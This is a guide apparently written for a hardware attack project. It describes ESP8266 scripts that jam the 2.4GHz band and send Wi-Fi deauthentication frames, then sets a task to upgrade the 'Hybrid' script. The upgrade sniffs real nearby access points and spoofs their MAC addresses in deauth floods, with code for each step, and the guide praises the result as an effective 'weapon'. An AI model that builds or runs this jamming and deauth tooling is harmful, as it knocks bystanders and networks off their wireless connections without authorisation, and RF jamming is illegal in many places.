# RF-Type Scripts: Code Guide & Improvement Task

## Overview

The scripts in this directory (`Pure.ino` and `Hybrid.ino`) are focused on **Layer 1 (physical-level) attacks**. Instead of manipulating protocols, they generate raw radio frequency (RF) noise to disrupt any and all communications on the 2.4GHz band. This makes them protocol-agnostic and highly effective against Wi-Fi, Bluetooth, Zigbee, and other wireless devices.

-   **`Pure.ino`** is a "smart" jammer that scans for the most active channels and focuses its attack on them.
-   **`Hybrid.ino`** combines this RF jamming with a Wi-Fi deauthentication attack, creating a powerful, dual-threat weapon.

## The Core Flaw: Hardcoded Deauthentication Target

The `Hybrid.ino` script is the most potent tool in this project, but its Wi-Fi attack component has a significant limitation: **it uses a hardcoded, fake MAC address** (`DE:AD:BE:EF:11:22`).

```cpp
// From Hybrid.ino
const uint8_t fakeAPmac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22};

// ...

void loop() {
  // ...
  if (now - lastDeauth > 300) {
    // This always sends a deauth packet from the same fake AP.
    sendDeauthESP(broadcast, fakeAPmac);
    lastDeauth = now;
  }
}
```

While this proves the concept, it's not an effective real-world attack. A proper deauthentication attack must spoof the MAC address of a **real, nearby Access Point** to be successful.

---

## Your Task: Integrate a Real-Time AP Scanner

Your goal is to upgrade the `Hybrid.ino` script by integrating the dynamic, multi-target scanning capabilities from the `WiFi-Type` scripts. This will transform the deauthentication portion of the attack from a proof-of-concept into a truly effective weapon.

This involves three main steps:
1.  Adding a promiscuous mode sniffer to discover real APs.
2.  Maintaining a dynamic list of found APs.
3.  Modifying the main loop to cycle through the real APs and use their MAC addresses in the deauth attack.

### Step 1: Add AP Tracking Structures and Variables

In the global variables section of `Hybrid.ino`, add the necessary structures and arrays to store information about the APs you discover.

```cpp
// Add this to your global variables

#define MAX_APS 10 // Max number of Wi-Fi targets to track

struct APEntry {
  uint8_t mac[6];
  uint8_t channel;
  unsigned long lastSeen;
};

APEntry aps[MAX_APS];
uint8_t apCount = 0;
uint8_t currentAP = 0;
```

### Step 2: Implement the Promiscuous Sniffer Callback

You will need to add a `snifferCallback` function and enable promiscuous mode in your `setup()` function. This function will be responsible for parsing beacon frames and adding the discovered APs to your list.

**Hint:** You can copy the `snifferCallback` and `registerAP` functions directly from the `Multi-Iteration.ino` script in the `WiFi-Type` directory. Don't forget to enable promiscuous mode in `setup()`:

```cpp
// In setup()
wifi_set_opmode(STATION_MODE);
wifi_set_promiscuous_rx_cb(snifferCallback); // Register your new function
wifi_promiscuous_enable(1);
```

### Step 3: Modify the Deauthentication Logic

Finally, update the deauthentication logic inside your `loop()` function. Instead of sending a packet from the `fakeAPmac`, it should now cycle through your list of real APs, tune the radio to the correct channel, and send a deauth packet spoofing the real AP's MAC address.

Here is a template for the new logic:

```cpp
// In loop()

if (now - lastDeauth > 500 && apCount > 0) { // Check if we have targets
  if (currentAP >= apCount) currentAP = 0; // Cycle through targets

  // Get the current target AP
  APEntry& target = aps[currentAP];

  // Set the ESP8266 to the correct channel for the deauth attack
  wifi_set_channel(target.channel);

  // Send the deauth packet using the real AP's MAC address
  sendDeauthESP(broadcast, target.mac);

  Serial.printf("[HYBRID-DEAUTH] Sent deauth to %02X:%02X:%02X:%02X:%02X:%02X\n",
                target.mac[0], target.mac[1], target.mac[2],
                target.mac[3], target.mac[4], target.mac[5]);

  currentAP++;
  lastDeauth = now;
}
```

By completing this task, you will have transformed `Hybrid.ino` into a truly formidable and intelligent multi-vector attack tool, capable of launching adaptive Layer 1 and Layer 2 attacks simultaneously.
